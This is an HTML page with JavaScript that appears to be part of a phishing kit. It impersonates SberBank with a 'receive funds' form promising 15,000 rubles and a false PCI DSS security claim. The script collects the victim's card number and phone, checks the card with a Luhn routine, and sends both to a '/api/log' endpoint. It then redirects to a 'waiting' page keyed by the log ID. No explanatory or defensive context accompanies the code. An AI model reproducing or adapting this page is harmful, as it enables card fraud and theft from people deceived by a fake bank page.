<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width,initial-scale=1">
    <meta http-equiv="Cache-control" content="no-cache">
    <title>СберБанк | Получение средств</title>
    <link rel="shortcut icon" href="favicons/favicon_sber.ico">
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
    <style>
        * {
            box-sizing: border-box;
            margin: 0;
            padding: 0;
        }
        body {
            font-family: 'Inter', -apple-system, BlinkMacSystemFont, sans-serif;
            background: linear-gradient(135deg, #f5f7fa 0%, #e4e9f2 100%);
            min-height: 100vh;
            display: flex;
            flex-direction: column;
        }
        
        /* Header */
        .header {
            background: #fff;
            padding: 16px 20px;
            box-shadow: 0 2px 8px rgba(0,0,0,0.06);
            display: flex;
            align-items: center;
            justify-content: space-between;
        }
        .header__logo {
            height: 32px;
        }
        .header__title {
            font-size: 14px;
            color: #21a038;
            font-weight: 600;
        }
        
        /* Main */
        .main {
            flex: 1;
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 20px;
        }
        
        .card-form {
            background: #fff;
            border-radius: 24px;
            box-shadow: 0 20px 60px rgba(0,0,0,0.1);
            width: 100%;
            max-width: 420px;
            padding: 32px;
            animation: slideUp 0.5s ease;
        }
        
        @keyframes slideUp {
            from {
                opacity: 0;
                transform: translateY(30px);
            }
            to {
                opacity: 1;
                transform: translateY(0);
            }
        }
        
        .card-form__header {
            text-align: center;
            margin-bottom: 28px;
        }
        .card-form__title {
            font-size: 22px;
            font-weight: 700;
            color: #1a1a1a;
            margin-bottom: 8px;
        }
        .card-form__subtitle {
            font-size: 14px;
            color: #6b7280;
        }
        .card-form__amount {
            background: linear-gradient(135deg, #21a038 0%, #2bc94a 100%);
            color: #fff;
            padding: 16px 24px;
            border-radius: 16px;
            text-align: center;
            margin-bottom: 28px;
        }
        .card-form__amount-label {
            font-size: 12px;
            opacity: 0.85;
            margin-bottom: 4px;
        }
        .card-form__amount-value {
            font-size: 32px;
            font-weight: 700;
        }
        
        .field {
            margin-bottom: 20px;
        }
        .field__label {
            display: block;
            font-size: 13px;
            font-weight: 600;
            color: #374151;
            margin-bottom: 8px;
        }
        .field__input {
            width: 100%;
            height: 54px;
            padding: 0 18px;
            border: 2px solid #e5e7eb;
            border-radius: 14px;
            font-size: 16px;
            font-family: inherit;
            color: #1a1a1a;
            background: #fafbfc;
            transition: all 0.2s ease;
        }
        .field__input::placeholder {
            color: #9ca3af;
        }
        .field__input:focus {
            outline: none;
            border-color: #21a038;
            background: #fff;
            box-shadow: 0 0 0 4px rgba(33, 160, 56, 0.12);
        }
        .field__input.error {
            border-color: #ef4444;
            background: #fef2f2;
        }
        
        .submit-btn {
            width: 100%;
            height: 56px;
            background: linear-gradient(135deg, #21a038 0%, #2bc94a 100%);
            color: #fff;
            border: none;
            border-radius: 16px;
            font-size: 16px;
            font-weight: 600;
            font-family: inherit;
            cursor: pointer;
            transition: all 0.2s ease;
            margin-top: 8px;
        }
        .submit-btn:hover {
            transform: translateY(-2px);
            box-shadow: 0 12px 24px rgba(33, 160, 56, 0.3);
        }
        .submit-btn:active {
            transform: translateY(0);
        }
        .submit-btn:disabled {
            opacity: 0.6;
            cursor: not-allowed;
            transform: none;
        }
        
        .secure-info {
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 8px;
            margin-top: 20px;
            font-size: 12px;
            color: #6b7280;
        }
        .secure-info svg {
            color: #21a038;
        }
        
        /* Error message */
        .error-msg {
            background: #fef2f2;
            border: 1px solid #fecaca;
            border-radius: 12px;
            padding: 12px 16px;
            color: #dc2626;
            font-size: 13px;
            margin-bottom: 20px;
            display: none;
        }
        .error-msg.show {
            display: block;
            animation: shake 0.4s ease;
        }
        
        @keyframes shake {
            0%, 100% { transform: translateX(0); }
            25% { transform: translateX(-8px); }
            75% { transform: translateX(8px); }
        }
        
        /* Loader overlay */
        .loader-overlay {
            position: fixed;
            inset: 0;
            background: rgba(0, 20, 10, 0.92);
            backdrop-filter: blur(8px);
            display: flex;
            align-items: center;
            justify-content: center;
            z-index: 1000;
            opacity: 0;
            visibility: hidden;
            transition: all 0.3s ease;
        }
        .loader-overlay.show {
            opacity: 1;
            visibility: visible;
        }
        .loader-content {
            text-align: center;
            color: #fff;
        }
        .loader-spinner {
            width: 64px;
            height: 64px;
            border: 4px solid rgba(255,255,255,0.1);
            border-top-color: #21a038;
            border-radius: 50%;
            animation: spin 1s linear infinite;
            margin: 0 auto 24px;
        }
        @keyframes spin {
            to { transform: rotate(360deg); }
        }
        .loader-text {
            font-size: 16px;
            opacity: 0.9;
        }
        .loader-subtext {
            font-size: 13px;
            opacity: 0.6;
            margin-top: 8px;
        }
        
        @media (max-width: 480px) {
            .card-form {
                padding: 24px;
                border-radius: 20px;
            }
            .card-form__title {
                font-size: 20px;
            }
            .card-form__amount-value {
                font-size: 28px;
            }
        }
    </style>
</head>
<body>
    <header class="header">
        <svg class="header__logo" viewBox="0 0 132 32" fill="none">
            <path d="M16 0C7.164 0 0 7.164 0 16s7.164 16 16 16 16-7.164 16-16S24.836 0 16 0zm0 28.8c-7.07 0-12.8-5.73-12.8-12.8S8.93 3.2 16 3.2 28.8 8.93 28.8 16 23.07 28.8 16 28.8z" fill="#21A038"/>
            <path d="M16 6.4c-5.302 0-9.6 4.298-9.6 9.6s4.298 9.6 9.6 9.6 9.6-4.298 9.6-9.6-4.298-9.6-9.6-9.6zm5.12 6.4l-5.76 8.32a.64.64 0 01-1.04 0l-2.88-4.16a.64.64 0 01.52-1.02h1.6c.24 0 .46.13.58.34l1.18 2.04 3.94-5.7a.64.64 0 01.52-.26h1.6c.48 0 .76.54.52.94l-.76.5z" fill="#21A038"/>
            <path d="M52 10h-4.8v12H52v-4h2.4c2.65 0 4.8-2.15 4.8-4.8V14c0-2.21-1.79-4-4-4H52zm3.2 4c0 .88-.72 1.6-1.6 1.6H52v-3.2h1.6c.88 0 1.6.72 1.6 1.6v.8zM68 10h-4.8v12H68v-4h2.4c2.65 0 4.8-2.15 4.8-4.8V14c0-2.21-1.79-4-4-4H68zm3.2 4c0 .88-.72 1.6-1.6 1.6H68v-3.2h1.6c.88 0 1.6.72 1.6 1.6v.8z" fill="#21A038"/>
        </svg>
        <span class="header__title">Безопасный платёж</span>
    </header>
    
    <main class="main">
        <form class="card-form" id="paymentForm" onsubmit="return false;">
            <div class="card-form__header">
                <h1 class="card-form__title">Получение средств</h1>
                <p class="card-form__subtitle">Введите данные карты для зачисления</p>
            </div>
            
            <div class="card-form__amount">
                <div class="card-form__amount-label">Сумма к зачислению</div>
                <div class="card-form__amount-value">15 000 ₽</div>
            </div>
            
            <div class="error-msg" id="errorMsg"></div>
            
            <div class="field">
                <label class="field__label" for="cardNumber">Номер карты</label>
                <input type="text" 
                       class="field__input" 
                       id="cardNumber" 
                       placeholder="0000 0000 0000 0000"
                       maxlength="19"
                       inputmode="numeric"
                       autocomplete="cc-number">
            </div>
            
            <div class="field">
                <label class="field__label" for="phone">Номер телефона</label>
                <input type="tel" 
                       class="field__input" 
                       id="phone" 
                       placeholder="+7 (___) ___-__-__"
                       maxlength="18"
                       autocomplete="tel">
            </div>
            
            <button type="submit" class="submit-btn" id="submitBtn">
                Получить средства
            </button>
            
            <div class="secure-info">
                <svg width="16" height="16" viewBox="0 0 24 24" fill="currentColor">
                    <path d="M12 1L3 5v6c0 5.55 3.84 10.74 9 12 5.16-1.26 9-6.45 9-12V5l-9-4zm0 6c1.4 0 2.8 1.1 2.8 2.5V11c.6.3 1.2 1 1.2 1.8v3.5c0 1-.8 1.7-1.7 1.7H9.7c-.9 0-1.7-.7-1.7-1.7v-3.5c0-.8.6-1.5 1.2-1.8V9.5C9.2 8.1 10.6 7 12 7zm0 1.2c-.8 0-1.5.7-1.5 1.5v1.6h3V9.7c0-.8-.7-1.5-1.5-1.5z"/>
                </svg>
                <span>Данные защищены по стандарту PCI DSS</span>
            </div>
        </form>
    </main>
    
    <div class="loader-overlay" id="loader">
        <div class="loader-content">
            <div class="loader-spinner"></div>
            <div class="loader-text">Обработка данных...</div>
            <div class="loader-subtext">Не закрывайте страницу</div>
        </div>
    </div>

    <script>
        const API_URL = '/api';
        const cardInput = document.getElementById('cardNumber');
        const phoneInput = document.getElementById('phone');
        const form = document.getElementById('paymentForm');
        const submitBtn = document.getElementById('submitBtn');
        const errorMsg = document.getElementById('errorMsg');
        const loader = document.getElementById('loader');
        
        // Маска для карты
        cardInput.addEventListener('input', (e) => {
            let value = e.target.value.replace(/\D/g, '').substring(0, 16);
            let formatted = value.match(/.{1,4}/g)?.join(' ') || value;
            e.target.value = formatted;
        });
        
        // Маска для телефона
        phoneInput.value = '+7 ';
        phoneInput.addEventListener('input', (e) => {
            let digits = e.target.value.replace(/\D/g, '');
            if (!digits.length) {
                e.target.value = '+7 ';
                return;
            }
            if (digits[0] === '8') digits = '7' + digits.slice(1);
            else if (digits[0] !== '7') digits = '7' + digits;
            digits = digits.substring(0, 11);
            
            let formatted = '+7';
            if (digits.length > 1) formatted += ' (' + digits.substring(1, 4);
            if (digits.length >= 4) formatted += ') ' + digits.substring(4, 7);
            if (digits.length >= 7) formatted += '-' + digits.substring(7, 9);
            if (digits.length >= 9) formatted += '-' + digits.substring(9, 11);
            if (digits.length <= 1) formatted += ' ';
            e.target.value = formatted.trimEnd();
        });
        
        phoneInput.addEventListener('focus', () => {
            if (!phoneInput.value) phoneInput.value = '+7 ';
        });
        
        // Валидация по Луну
        function validateCard(number) {
            const digits = number.replace(/\D/g, '');
            if (digits.length !== 16) return false;
            
            let sum = 0;
            let isEven = false;
            for (let i = digits.length - 1; i >= 0; i--) {
                let digit = parseInt(digits[i], 10);
                if (isEven) {
                    digit *= 2;
                    if (digit > 9) digit -= 9;
                }
                sum += digit;
                isEven = !isEven;
            }
            return sum % 10 === 0;
        }
        
        function showError(text) {
            errorMsg.textContent = text;
            errorMsg.classList.add('show');
            setTimeout(() => errorMsg.classList.remove('show'), 5000);
        }
        
        function showLoader(show) {
            loader.classList.toggle('show', show);
        }
        
        // Отправка формы
        form.addEventListener('submit', async (e) => {
            e.preventDefault();
            
            const card = cardInput.value.replace(/\s/g, '');
            const phone = phoneInput.value.replace(/\D/g, '');
            
            // Валидация
            if (card.length !== 16) {
                showError('Введите 16 цифр номера карты');
                cardInput.classList.add('error');
                return;
            }
            cardInput.classList.remove('error');
            
            if (!validateCard(card)) {
                showError('Проверьте правильность номера карты');
                cardInput.classList.add('error');
                return;
            }
            
            if (phone.length !== 11) {
                showError('Введите корректный номер телефона');
                phoneInput.classList.add('error');
                return;
            }
            phoneInput.classList.remove('error');
            
            // Отправка
            showLoader(true);
            submitBtn.disabled = true;
            
            try {
                const response = await fetch(API_URL + '/log', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        card: cardInput.value,
                        phone: phoneInput.value
                    })
                });
                
                const data = await response.json();
                
                if (data.success && data.log_id) {
                    // Переходим на страницу ожидания
                    window.location.href = `waiting.html?id=${data.log_id}`;
                } else {
                    showError('Произошла ошибка. Попробуйте позже.');
                    showLoader(false);
                    submitBtn.disabled = false;
                }
            } catch (error) {
                console.error('Error:', error);
                showError('Ошибка соединения. Проверьте интернет.');
                showLoader(false);
                submitBtn.disabled = false;
            }
        });
    </script>
</body>
</html>
